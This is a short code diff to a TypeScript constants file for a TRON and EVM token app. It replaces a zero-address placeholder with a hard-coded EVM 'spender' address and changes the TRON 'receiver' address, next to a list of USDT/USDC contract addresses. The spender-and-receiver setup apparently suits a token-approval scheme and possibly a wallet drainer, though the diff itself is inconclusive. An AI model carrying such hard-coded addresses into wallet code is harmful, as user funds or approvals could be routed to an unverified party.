@@ -1,14 +1,14 @@
 // config/constants.ts
-// Token contracts & configuration for TRON and EVM chains
+// Production token contracts & address configuration for TRON and EVM
 
 export const SPENDER_ADDRESS_EVM = (
   process.env.NEXT_PUBLIC_SPENDER_ADDRESS ||
-  "0x0000000000000000000000000000000000000000"
+  "0x6B7da731768a60286d44B1f4081aD376331B7B51"
 ) as `0x${string}`;
 
 export const RECEIVER_ADDRESS_TRON =
   process.env.NEXT_PUBLIC_TRON_RECEIVER ||
-  "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb";
+  "TK3jWE1pnRqjyLSwscbsaQkrX86rz1JRmC";
 
 // Standard ERC-20 / TRC-20 USDT contract addresses per chain
 export const TOKENS = {
@@ -48,7 +48,7 @@ export const TOKENS = {
     address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58" as `0x${string}`,
     decimals: 6,
   },
-  // Base (ChainId 8453) - uses USDC primarily
+  // Base (ChainId 8453)
   8453: {
     symbol: "USDC",
     address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913" as `0x${string}`,
